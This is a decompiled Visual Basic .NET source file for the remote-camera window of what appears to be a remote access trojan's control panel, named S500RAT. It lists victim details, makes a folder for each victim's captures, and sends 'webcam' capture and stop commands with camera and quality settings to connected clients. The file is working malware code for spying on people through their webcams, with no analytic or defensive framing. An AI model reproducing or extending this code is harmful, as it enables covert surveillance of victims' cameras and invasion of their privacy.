Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000011 RID: 17
	<DesignerGenerated()>
	Public Partial Class FormCamera
		Inherits Form

		' Token: 0x060000E4 RID: 228 RVA: 0x00007E84 File Offset: 0x00006084
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormCamera_Load
			AddHandler MyBase.Resize, AddressOf Me.FormCamera_Resize
			Me.FormSize = False
			Me.sw = Stopwatch.StartNew()
			Me.FPS = 0
			Me.SaveIt = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000072 RID: 114
		' (get) Token: 0x060000E7 RID: 231 RVA: 0x0000925E File Offset: 0x0000745E
		' (set) Token: 0x060000E8 RID: 232 RVA: 0x00009268 File Offset: 0x00007468
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000073 RID: 115
		' (get) Token: 0x060000E9 RID: 233 RVA: 0x000092AB File Offset: 0x000074AB
		' (set) Token: 0x060000EA RID: 234 RVA: 0x000092B5 File Offset: 0x000074B5
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000074 RID: 116
		' (get) Token: 0x060000EB RID: 235 RVA: 0x000092BE File Offset: 0x000074BE
		' (set) Token: 0x060000EC RID: 236 RVA: 0x000092C8 File Offset: 0x000074C8
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000075 RID: 117
		' (get) Token: 0x060000ED RID: 237 RVA: 0x000092D1 File Offset: 0x000074D1
		' (set) Token: 0x060000EE RID: 238 RVA: 0x000092DB File Offset: 0x000074DB
		Public Overridable Property pictureBox1 As PictureBox

		' Token: 0x17000076 RID: 118
		' (get) Token: 0x060000EF RID: 239 RVA: 0x000092E4 File Offset: 0x000074E4
		' (set) Token: 0x060000F0 RID: 240 RVA: 0x000092EE File Offset: 0x000074EE
		Friend Overridable Property TextFPS As Label

		' Token: 0x17000077 RID: 119
		' (get) Token: 0x060000F1 RID: 241 RVA: 0x000092F7 File Offset: 0x000074F7
		' (set) Token: 0x060000F2 RID: 242 RVA: 0x00009301 File Offset: 0x00007501
		Private Overridable Property Label10 As Label

		' Token: 0x17000078 RID: 120
		' (get) Token: 0x060000F3 RID: 243 RVA: 0x0000930A File Offset: 0x0000750A
		' (set) Token: 0x060000F4 RID: 244 RVA: 0x00009314 File Offset: 0x00007514
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000079 RID: 121
		' (get) Token: 0x060000F5 RID: 245 RVA: 0x0000931D File Offset: 0x0000751D
		' (set) Token: 0x060000F6 RID: 246 RVA: 0x00009327 File Offset: 0x00007527
		Public Overridable Property SaveScreen As Guna2ToggleSwitch

		' Token: 0x1700007A RID: 122
		' (get) Token: 0x060000F7 RID: 247 RVA: 0x00009330 File Offset: 0x00007530
		' (set) Token: 0x060000F8 RID: 248 RVA: 0x0000933A File Offset: 0x0000753A
		Friend Overridable Property Label2 As Label

		' Token: 0x1700007B RID: 123
		' (get) Token: 0x060000F9 RID: 249 RVA: 0x00009343 File Offset: 0x00007543
		' (set) Token: 0x060000FA RID: 250 RVA: 0x0000934D File Offset: 0x0000754D
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700007C RID: 124
		' (get) Token: 0x060000FB RID: 251 RVA: 0x00009356 File Offset: 0x00007556
		' (set) Token: 0x060000FC RID: 252 RVA: 0x00009360 File Offset: 0x00007560
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x1700007D RID: 125
		' (get) Token: 0x060000FD RID: 253 RVA: 0x00009369 File Offset: 0x00007569
		' (set) Token: 0x060000FE RID: 254 RVA: 0x00009374 File Offset: 0x00007574
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700007E RID: 126
		' (get) Token: 0x060000FF RID: 255 RVA: 0x000093B7 File Offset: 0x000075B7
		' (set) Token: 0x06000100 RID: 256 RVA: 0x000093C1 File Offset: 0x000075C1
		Friend Overridable Property comboBox1 As UIComboBox

		' Token: 0x1700007F RID: 127
		' (get) Token: 0x06000101 RID: 257 RVA: 0x000093CA File Offset: 0x000075CA
		' (set) Token: 0x06000102 RID: 258 RVA: 0x000093D4 File Offset: 0x000075D4
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000080 RID: 128
		' (get) Token: 0x06000103 RID: 259 RVA: 0x000093DD File Offset: 0x000075DD
		' (set) Token: 0x06000104 RID: 260 RVA: 0x000093E7 File Offset: 0x000075E7
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000081 RID: 129
		' (get) Token: 0x06000105 RID: 261 RVA: 0x000093F0 File Offset: 0x000075F0
		' (set) Token: 0x06000106 RID: 262 RVA: 0x000093FA File Offset: 0x000075FA
		Friend Overridable Property ImageSaved As Label

		' Token: 0x17000082 RID: 130
		' (get) Token: 0x06000107 RID: 263 RVA: 0x00009403 File Offset: 0x00007603
		' (set) Token: 0x06000108 RID: 264 RVA: 0x0000940D File Offset: 0x0000760D
		Friend Overridable Property Quality As Guna2HtmlLabel

		' Token: 0x17000083 RID: 131
		' (get) Token: 0x06000109 RID: 265 RVA: 0x00009416 File Offset: 0x00007616
		' (set) Token: 0x0600010A RID: 266 RVA: 0x00009420 File Offset: 0x00007620
		Friend Overridable Property QualityUsing As Guna2TrackBar
			<CompilerGenerated()>
			Get
				Return Me._QualityUsing
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TrackBar)
				Dim value2 As ScrollEventHandler = AddressOf Me.QualityUsing_Scroll
				Dim qualityUsing As Guna2TrackBar = Me._QualityUsing
				If qualityUsing IsNot Nothing Then
					RemoveHandler qualityUsing.Scroll, value2
				End If
				Me._QualityUsing = value
				qualityUsing = Me._QualityUsing
				If qualityUsing IsNot Nothing Then
					AddHandler qualityUsing.Scroll, value2
				End If
			End Set
		End Property

		' Token: 0x17000084 RID: 132
		' (get) Token: 0x0600010B RID: 267 RVA: 0x00009463 File Offset: 0x00007663
		' (set) Token: 0x0600010C RID: 268 RVA: 0x0000946D File Offset: 0x0000766D
		Friend Overridable Property SizeImage As Label

		' Token: 0x17000085 RID: 133
		' (get) Token: 0x0600010D RID: 269 RVA: 0x00009476 File Offset: 0x00007676
		' (set) Token: 0x0600010E RID: 270 RVA: 0x00009480 File Offset: 0x00007680
		Private Overridable Property Label6 As Label

		' Token: 0x17000086 RID: 134
		' (get) Token: 0x0600010F RID: 271 RVA: 0x00009489 File Offset: 0x00007689
		' (set) Token: 0x06000110 RID: 272 RVA: 0x00009494 File Offset: 0x00007694
		Friend Overridable Property StartAndStop As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._StartAndStop
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.StartAndStop_Click
				Dim startAndStop As Guna2GradientButton = Me._StartAndStop
				If startAndStop IsNot Nothing Then
					RemoveHandler startAndStop.Click, value2
				End If
				Me._StartAndStop = value
				startAndStop = Me._StartAndStop
				If startAndStop IsNot Nothing Then
					AddHandler startAndStop.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000087 RID: 135
		' (get) Token: 0x06000111 RID: 273 RVA: 0x000094D7 File Offset: 0x000076D7
		' (set) Token: 0x06000112 RID: 274 RVA: 0x000094E1 File Offset: 0x000076E1
		Public Property F As FormS500

		' Token: 0x17000088 RID: 136
		' (get) Token: 0x06000113 RID: 275 RVA: 0x000094EA File Offset: 0x000076EA
		' (set) Token: 0x06000114 RID: 276 RVA: 0x000094F4 File Offset: 0x000076F4
		Friend Property Client As Clients

		' Token: 0x17000089 RID: 137
		' (get) Token: 0x06000115 RID: 277 RVA: 0x000094FD File Offset: 0x000076FD
		' (set) Token: 0x06000116 RID: 278 RVA: 0x00009507 File Offset: 0x00007707
		Friend Property ParentClient As Clients

		' Token: 0x1700008A RID: 138
		' (get) Token: 0x06000117 RID: 279 RVA: 0x00009510 File Offset: 0x00007710
		' (set) Token: 0x06000118 RID: 280 RVA: 0x0000951A File Offset: 0x0000771A
		Public Property FullPath As String

		' Token: 0x1700008B RID: 139
		' (get) Token: 0x06000119 RID: 281 RVA: 0x00009523 File Offset: 0x00007723
		' (set) Token: 0x0600011A RID: 282 RVA: 0x0000952D File Offset: 0x0000772D
		Public Property GetImage As Image

		' Token: 0x0600011B RID: 283 RVA: 0x00009538 File Offset: 0x00007738
		Private Sub FormCamera_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Try
				Dim text As String = Path.Combine(Application.StartupPath, "Clients", "Remote Camera\" + Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2)) + "\"
				Dim flag As Boolean = Not Directory.Exists(text)
				If flag Then
					Directory.CreateDirectory(text)
					Me.FullPath = text
				Else
					Me.FullPath = text
				End If
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600011C RID: 284 RVA: 0x0000969C File Offset: 0x0000789C
		Private Sub FormCamera_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x0600011D RID: 285 RVA: 0x00009730 File Offset: 0x00007930
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x0600011E RID: 286 RVA: 0x0000979C File Offset: 0x0000799C
		Private Sub StartAndStop_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Start", False) = 0
				If flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "webcam"
					msgPack.ForcePathObject("Command").AsString = "capture"
					msgPack.ForcePathObject("List").AsInteger = CLng(Me.comboBox1.SelectedIndex)
					msgPack.ForcePathObject("Quality").AsInteger = CLng(Convert.ToInt32(Me.QualityUsing.Value))
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.QualityUsing.Enabled = False
					Me.SaveScreen.Enabled = False
					Me.StartAndStop.Text = "Stop"
				Else
					Dim msgPack2 As MsgPack = New MsgPack()
					msgPack2.ForcePathObject("Packet").AsString = "webcam"
					msgPack2.ForcePathObject("Command").AsString = "stop"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
					Me.QualityUsing.Enabled = True
					Me.SaveScreen.Enabled = True
					Me.StartAndStop.Text = "Start"
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600011F RID: 287 RVA: 0x00009930 File Offset: 0x00007B30
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			Try
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000120 RID: 288 RVA: 0x00009980 File Offset: 0x00007B80
		Private Sub QualityUsing_Scroll(sender As Object, e As ScrollEventArgs)
			Try
				Dim flag As Boolean = Me.QualityUsing.Value < 11
				If flag Then
					Me.Quality.Text = Conversions.ToString(10) + "%Quality"
				Else
					Me.Quality.Text = Conversions.ToString(Me.QualityUsing.Value) + "%Quality"
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0400007D RID: 125
		Private FormSize As Boolean

		' Token: 0x04000081 RID: 129
		Public sw As Stopwatch

		' Token: 0x04000082 RID: 130
		Public FPS As Integer

		' Token: 0x04000083 RID: 131
		Public SaveIt As Boolean
	End Class
End Namespace
